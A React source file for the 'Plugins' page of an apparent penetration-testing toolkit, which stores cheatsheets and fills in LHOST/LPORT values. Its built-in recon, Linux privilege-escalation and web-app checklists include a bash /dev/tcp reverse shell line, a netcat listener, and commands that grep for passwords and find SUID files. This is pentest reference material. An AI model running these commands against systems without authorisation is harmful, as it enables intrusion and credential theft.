import { useState, useEffect, useCallback, useMemo } from 'react';
import { Puzzle, Plus, Pencil, Trash2, X } from 'lucide-react';
import { Card } from '../components/ui/Card.jsx';
import { Input } from '../components/ui/Input.jsx';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import { useAppStore } from '../store/app.js';
import { ToolHelp } from '../components/ui/ToolHelp.jsx';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';

const STORAGE_KEY = 'slimeshell-plugins';

const CATEGORIES = ['Custom Tool', 'Cheatsheet', 'Generator', 'Converter', 'Other'];

const CATEGORY_BADGE = {
  'Custom Tool': { bg: 'rgba(196,181,253,0.15)', color: '#C4B5FD' },
  Cheatsheet: { bg: 'rgba(125,211,252,0.12)', color: '#7DD3FC' },
  Generator: { bg: 'rgba(110,231,183,0.12)', color: '#6EE7B7' },
  Converter: { bg: 'rgba(251,191,36,0.12)', color: '#FBBF24' },
  Other: { bg: 'rgba(156,163,175,0.12)', color: '#9CA3AF' },
};

const DEFAULT_PLUGINS = [
  {
    id: 'preset-quick-recon',
    name: 'Quick Recon',
    description: 'Host discovery → ports → services → web dirs',
    category: 'Cheatsheet',
    icon: '🔭',
    content: `## Quick Recon Checklist

- [ ] Ping / ICMP check (if allowed)
- [ ] Quick port scan: nmap -T4 -p- TARGET
- [ ] Version scan: nmap -sC -sV -p <ports> TARGET
- [ ] UDP top ports (if relevant): nmap -sU --top-ports 100 TARGET
- [ ] OS fingerprint: nmap -O TARGET (or -A cautiously)
- [ ] Web: whatweb, gobuster/ffuf on common paths
- [ ] DNS / subdomains: subfinder, ffuf -w subs -u http://FUZZ.target
- [ ] Screenshots: aquatone / eyewitness (optional)
- [ ] Listener ready: nc -lvnp {{LPORT}} on {{LHOST}}
- [ ] Log everything in notes`,
  },
  {
    id: 'preset-privesc',
    name: 'Privilege Escalation Checklist',
    description: 'Linux local enumeration & common vectors',
    category: 'Cheatsheet',
    icon: '🪜',
    content: `## Linux Privilege Escalation — Quick Pass

### System
- [ ] id, whoami, groups
- [ ] uname -a, cat /etc/os-release
- [ ] sudo -l (password / NOPASSWD)
- [ ] SUID/SGID: find / -perm -4000 -type f 2>/dev/null

### Cron & timers
- [ ] crontab -l, ls -la /etc/cron*
- [ ] systemctl list-timers

### Network & secrets
- [ ] ss -tulpn / netstat
- [ ] env | grep -i pass
- [ ] grep -Ri password /home 2>/dev/null | head

### Writable paths
- [ ] find / -writable -type d 2>/dev/null | grep -v proc
- [ ] PATH hijack, LD_PRELOAD (if applicable)

### Kernel / CVE
- [ ] linpeas / linux-exploit-suggester (if allowed)

### Pivot hint
Reverse shell test: bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1`,
  },
  {
    id: 'preset-webapp',
    name: 'Web App Test Checklist',
    description: 'OWASP-style quick pass for web targets',
    category: 'Cheatsheet',
    icon: '🌐',
    content: `## Web Application Test Checklist (OWASP-style)

### Recon
- [ ] Map tech stack (headers, JS, errors)
- [ ] Spider / crawl, note all parameters & forms

### Injection
- [ ] SQLi on inputs (', "", OR 1=1)
- [ ] NoSQL / LDAP if stack suggests it
- [ ] Command injection (|, ;, \` payloads)
- [ ] SSTI in template-like fields

### Access control
- [ ] IDOR on object IDs (sequential / UUID guess)
- [ ] Horizontal/vertical privilege tests
- [ ] Forced browsing to admin paths

### XSS & client
- [ ] Reflected/stored XSS on sinks
- [ ] DOM XSS sources → sinks
- [ ] CSP / cookie flags (HttpOnly, Secure, SameSite)

### File & SSRF
- [ ] LFI/RFI on file params
- [ ] XXE if XML uploads
- [ ] SSRF on URL/fetch parameters → internal {{LHOST}}:{{LPORT}}

### Auth & session
- [ ] Weak creds, default accounts
- [ ] Session fixation, logout invalidation

### Misc
- [ ] CORS misconfig, open redirects
- [ ] Mass assignment, verbose errors`,
  },
];

function loadPluginsFromStorage() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw !== null) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return parsed;
    }
  } catch {
    /* ignore */
  }
  return DEFAULT_PLUGINS;
}

function applyPlaceholders(text, lhost, lport) {
  if (!text) return '';
  return String(text)
    .replaceAll('{{LHOST}}', lhost ?? '')
    .replaceAll('{{LPORT}}', lport ?? '');
}

function firstLines(text, n) {
  const lines = String(text || '').split('\n');
  return lines.slice(0, n).join('\n');
}

const emptyForm = {
  name: '',
  description: '',
  category: 'Custom Tool',
  icon: '🔧',
  content: '',
};

export default function Plugins() {
  const lhost = useAppStore((s) => s.lhost);
  const lport = useAppStore((s) => s.lport);

  const [plugins, setPlugins] = useState(loadPluginsFromStorage);
  const [formOpen, setFormOpen] = useState(false);
  const [editingId, setEditingId] = useState(null);
  const [form, setForm] = useState(emptyForm);
  const [useModalPlugin, setUseModalPlugin] = useState(null);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(plugins));
    } catch {
      /* ignore */
    }
  }, [plugins]);

  const resolvedUseContent = useMemo(() => {
    if (!useModalPlugin) return '';
    return applyPlaceholders(useModalPlugin.content, lhost, lport);
  }, [useModalPlugin, lhost, lport]);

  const openCreate = useCallback(() => {
    setEditingId(null);
    setForm(emptyForm);
    setFormOpen(true);
  }, []);

  const openEdit = useCallback((p) => {
    setEditingId(p.id);
    setForm({
      name: p.name,
      description: p.description || '',
      category: p.category,
      icon: p.icon || '🔧',
      content: p.content || '',
    });
    setFormOpen(true);
  }, []);

  const closeForm = useCallback(() => {
    setFormOpen(false);
    setEditingId(null);
    setForm(emptyForm);
  }, []);

  const handleSavePlugin = useCallback(() => {
    const name = form.name.trim();
    if (!name) return;
    if (editingId) {
      setPlugins((prev) =>
        prev.map((p) =>
          p.id === editingId
            ? {
                ...p,
                name,
                description: form.description.trim(),
                category: form.category,
                icon: form.icon.trim() || '🔧',
                content: form.content,
              }
            : p
        )
      );
    } else {
      const id =
        typeof crypto !== 'undefined' && crypto.randomUUID
          ? crypto.randomUUID()
          : `plugin-${Date.now()}`;
      setPlugins((prev) => [
        ...prev,
        {
          id,
          name,
          description: form.description.trim(),
          category: form.category,
          icon: form.icon.trim() || '🔧',
          content: form.content,
        },
      ]);
    }
    closeForm();
  }, [form, editingId, closeForm]);

  const handleDelete = useCallback((id) => {
    setPlugins((prev) => prev.filter((p) => p.id !== id));
    setUseModalPlugin((cur) => (cur && cur.id === id ? null : cur));
  }, []);

  const updateField = (key, value) => {
    setForm((f) => ({ ...f, [key]: value }));
  };

  const labelStyle = {
    fontFamily: mono,
    fontSize: 10,
    fontWeight: 600,
    color: 'rgba(255,255,255,0.45)',
    textTransform: 'uppercase',
    letterSpacing: '0.06em',
    marginBottom: 6,
    display: 'block',
  };

  const inputBase = {
    width: '100%',
    boxSizing: 'border-box',
    background: '#1A1F2E',
    border: '1px solid rgba(255,255,255,0.08)',
    borderRadius: 8,
    padding: '10px 12px',
    fontFamily: mono,
    fontSize: 12,
    color: '#E2E8F0',
    outline: 'none',
  };

  const modalBackdrop = {
    position: 'fixed',
    inset: 0,
    zIndex: 8000,
    background: 'rgba(0,0,0,0.65)',
    backdropFilter: 'blur(6px)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 24,
  };

  const modalPanel = {
    background: '#1A1F2E',
    border: '1px solid rgba(196,181,253,0.12)',
    borderRadius: 14,
    maxWidth: 560,
    width: '100%',
    maxHeight: '90vh',
    overflow: 'hidden',
    display: 'flex',
    flexDirection: 'column',
    boxShadow: '0 24px 64px rgba(0,0,0,0.45)',
  };

  return (
    <div style={{ maxWidth: 1200, margin: '0 auto' }}>
      <div
        style={{
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          flexWrap: 'wrap',
          gap: 16,
          marginBottom: 28,
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
          <div
            style={{
              width: 36,
              height: 36,
              borderRadius: 10,
              background: 'rgba(196,181,253,0.12)',
              border: '1px solid rgba(196,181,253,0.25)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              flexShrink: 0,
            }}
          >
            <Puzzle size={20} strokeWidth={2} style={{ color: '#C4B5FD' }} />
          </div>
          <h1
            style={{
              fontFamily: heading,
              fontSize: 22,
              fontWeight: 700,
              color: '#F1F5F9',
              margin: 0,
            }}
          >
            Plugins
          </h1>
          <ToolHelp title="Plugins" description="Custom cheatsheet manager with variable interpolation. Create your own reference sheets with dynamic values." steps={["Create a new plugin/cheatsheet","Add commands with variables using {{VAR}} syntax","Set default values for your variables","Use and share your custom cheatsheets"]} tips={["Variables auto-substitute when you set values","Great for team-specific command references","Import/export plugins for sharing"]} />
        </div>
        <button
          type="button"
          onClick={openCreate}
          style={{
            display: 'inline-flex',
            alignItems: 'center',
            gap: 8,
            padding: '10px 18px',
            borderRadius: 10,
            border: 'none',
            cursor: 'pointer',
            fontFamily: heading,
            fontSize: 13,
            fontWeight: 600,
            color: '#0B0F18',
            background: 'linear-gradient(135deg, #C4B5FD, #A78BFA)',
            boxShadow: '0 4px 20px rgba(196,181,253,0.25)',
          }}
        >
          <Plus size={18} strokeWidth={2.5} />
          Create Plugin
        </button>
      </div>

      <div
        style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(3, minmax(0, 1fr))',
          gap: 16,
        }}
      >
        {plugins.map((p) => {
          const badge = CATEGORY_BADGE[p.category] || CATEGORY_BADGE.Other;
          return (
            <Card
              key={p.id}
              style={{
                display: 'flex',
                flexDirection: 'column',
                gap: 10,
                minHeight: 0,
                background: '#161B26',
                borderColor: 'rgba(255,255,255,0.06)',
              }}
            >
              <div style={{ fontSize: 32, lineHeight: 1 }}>{p.icon || '🔧'}</div>
              <div
                style={{
                  fontFamily: heading,
                  fontSize: 14,
                  fontWeight: 600,
                  color: '#E2E8F0',
                }}
              >
                {p.name}
              </div>
              <span
                style={{
                  alignSelf: 'flex-start',
                  fontFamily: mono,
                  fontSize: 9,
                  fontWeight: 600,
                  textTransform: 'uppercase',
                  letterSpacing: '0.04em',
                  padding: '4px 10px',
                  borderRadius: 9999,
                  background: badge.bg,
                  color: badge.color,
                }}
              >
                {p.category}
              </span>
              <p
                style={{
                  fontFamily: mono,
                  fontSize: 11,
                  color: 'rgba(255,255,255,0.38)',
                  margin: 0,
                  lineHeight: 1.45,
                  minHeight: 32,
                }}
              >
                {p.description || '—'}
              </p>
              <pre
                style={{
                  fontFamily: mono,
                  fontSize: 10,
                  color: 'rgba(226,232,240,0.75)',
                  background: '#0B0F18',
                  borderRadius: 8,
                  padding: '10px 12px',
                  margin: 0,
                  overflow: 'hidden',
                  whiteSpace: 'pre-wrap',
                  wordBreak: 'break-word',
                  maxHeight: 72,
                  lineHeight: 1.4,
                  border: '1px solid rgba(255,255,255,0.04)',
                }}
              >
                {firstLines(p.content, 3)}
              </pre>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, marginTop: 'auto' }}>
                <button
                  type="button"
                  onClick={() => setUseModalPlugin(p)}
                  style={{
                    flex: 1,
                    minWidth: 72,
                    padding: '8px 12px',
                    borderRadius: 8,
                    border: '1px solid rgba(196,181,253,0.35)',
                    background: 'rgba(196,181,253,0.1)',
                    color: '#C4B5FD',
                    fontFamily: heading,
                    fontSize: 12,
                    fontWeight: 600,
                    cursor: 'pointer',
                  }}
                >
                  Use
                </button>
                <button
                  type="button"
                  onClick={() => openEdit(p)}
                  style={{
                    padding: '8px 12px',
                    borderRadius: 8,
                    border: '1px solid rgba(255,255,255,0.1)',
                    background: 'rgba(255,255,255,0.04)',
                    color: '#94A3B8',
                    fontFamily: mono,
                    fontSize: 11,
                    fontWeight: 600,
                    cursor: 'pointer',
                    display: 'inline-flex',
                    alignItems: 'center',
                    gap: 6,
                  }}
                >
                  <Pencil size={14} /> Edit
                </button>
                <button
                  type="button"
                  onClick={() => handleDelete(p.id)}
                  style={{
                    padding: '8px 12px',
                    borderRadius: 8,
                    border: '1px solid rgba(251,113,133,0.25)',
                    background: 'rgba(251,113,133,0.08)',
                    color: '#FB7185',
                    fontFamily: mono,
                    fontSize: 11,
                    fontWeight: 600,
                    cursor: 'pointer',
                    display: 'inline-flex',
                    alignItems: 'center',
                    gap: 6,
                  }}
                >
                  <Trash2 size={14} /> Delete
                </button>
              </div>
            </Card>
          );
        })}
      </div>

      {formOpen && (
        <div
          style={modalBackdrop}
          onClick={closeForm}
          onKeyDown={(e) => e.key === 'Escape' && closeForm()}
          role="presentation"
        >
          <div
            role="dialog"
            aria-modal="true"
            style={{ ...modalPanel, maxWidth: 520 }}
            onClick={(e) => e.stopPropagation()}
          >
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                padding: '16px 20px',
                borderBottom: '1px solid rgba(255,255,255,0.06)',
              }}
            >
              <span
                style={{
                  fontFamily: heading,
                  fontSize: 16,
                  fontWeight: 700,
                  color: '#F1F5F9',
                }}
              >
                {editingId ? 'Edit plugin' : 'New plugin'}
              </span>
              <button
                type="button"
                onClick={closeForm}
                style={{
                  background: 'transparent',
                  border: 'none',
                  color: '#64748B',
                  cursor: 'pointer',
                  padding: 4,
                  display: 'flex',
                }}
                aria-label="Close"
              >
                <X size={22} />
              </button>
            </div>
            <div
              style={{
                padding: 20,
                overflowY: 'auto',
                display: 'flex',
                flexDirection: 'column',
                gap: 16,
              }}
            >
              <div>
                <Input
                  label="Name"
                  required
                  value={form.name}
                  onChange={(e) => updateField('name', e.target.value)}
                  placeholder="My reverse shell template"
                />
              </div>
              <div>
                <label style={labelStyle}>Description</label>
                <textarea
                  value={form.description}
                  onChange={(e) => updateField('description', e.target.value)}
                  placeholder="Short summary"
                  rows={2}
                  style={{ ...inputBase, resize: 'vertical', minHeight: 56 }}
                />
              </div>
              <div>
                <label style={labelStyle}>Category</label>
                <select
                  value={form.category}
                  onChange={(e) => updateField('category', e.target.value)}
                  style={{ ...inputBase, cursor: 'pointer' }}
                >
                  {CATEGORIES.map((c) => (
                    <option key={c} value={c}>
                      {c}
                    </option>
                  ))}
                </select>
              </div>
              <div>
                <Input
                  label="Icon (emoji)"
                  value={form.icon}
                  onChange={(e) => updateField('icon', e.target.value)}
                  placeholder="🔧"
                  maxLength={8}
                />
              </div>
              <div>
                <label style={labelStyle}>Content</label>
                <textarea
                  value={form.content}
                  onChange={(e) => updateField('content', e.target.value)}
                  placeholder="Command template with {{LHOST}} / {{LPORT}}, cheatsheet, or script..."
                  rows={12}
                  style={{ ...inputBase, resize: 'vertical', minHeight: 200, lineHeight: 1.5 }}
                />
              </div>
              <button
                type="button"
                onClick={handleSavePlugin}
                disabled={!form.name.trim()}
                style={{
                  marginTop: 4,
                  padding: '12px 16px',
                  borderRadius: 10,
                  border: 'none',
                  cursor: form.name.trim() ? 'pointer' : 'not-allowed',
                  opacity: form.name.trim() ? 1 : 0.45,
                  fontFamily: heading,
                  fontSize: 14,
                  fontWeight: 600,
                  color: '#0B0F18',
                  background: 'linear-gradient(135deg, #C4B5FD, #A78BFA)',
                }}
              >
                Save
              </button>
            </div>
          </div>
        </div>
      )}

      {useModalPlugin && (
        <div
          style={modalBackdrop}
          onClick={() => setUseModalPlugin(null)}
          role="presentation"
        >
          <div
            role="dialog"
            aria-modal="true"
            style={modalPanel}
            onClick={(e) => e.stopPropagation()}
          >
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                gap: 12,
                padding: '16px 20px',
                borderBottom: '1px solid rgba(255,255,255,0.06)',
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, minWidth: 0 }}>
                <span style={{ fontSize: 24 }}>{useModalPlugin.icon}</span>
                <span
                  style={{
                    fontFamily: heading,
                    fontSize: 16,
                    fontWeight: 700,
                    color: '#F1F5F9',
                    overflow: 'hidden',
                    textOverflow: 'ellipsis',
                    whiteSpace: 'nowrap',
                  }}
                >
                  {useModalPlugin.name}
                </span>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexShrink: 0 }}>
                <CopyButton text={resolvedUseContent} />
                <button
                  type="button"
                  onClick={() => setUseModalPlugin(null)}
                  style={{
                    background: 'transparent',
                    border: 'none',
                    color: '#64748B',
                    cursor: 'pointer',
                    padding: 4,
                    display: 'flex',
                  }}
                  aria-label="Close"
                >
                  <X size={22} />
                </button>
              </div>
            </div>
            <div style={{ padding: 20, overflowY: 'auto', flex: 1, minHeight: 0 }}>
              <pre
                style={{
                  fontFamily: mono,
                  fontSize: 12,
                  color: '#E2E8F0',
                  background: '#0B0F18',
                  borderRadius: 10,
                  padding: 16,
                  margin: 0,
                  whiteSpace: 'pre-wrap',
                  wordBreak: 'break-word',
                  lineHeight: 1.55,
                  border: '1px solid rgba(255,255,255,0.06)',
                }}
              >
                {resolvedUseContent}
              </pre>
              <p
                style={{
                  fontFamily: mono,
                  fontSize: 10,
                  color: 'rgba(255,255,255,0.35)',
                  marginTop: 12,
                  marginBottom: 0,
                }}
              >
                Placeholders: {'{{LHOST}}'} → {lhost} · {'{{LPORT}}'} → {lport}
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
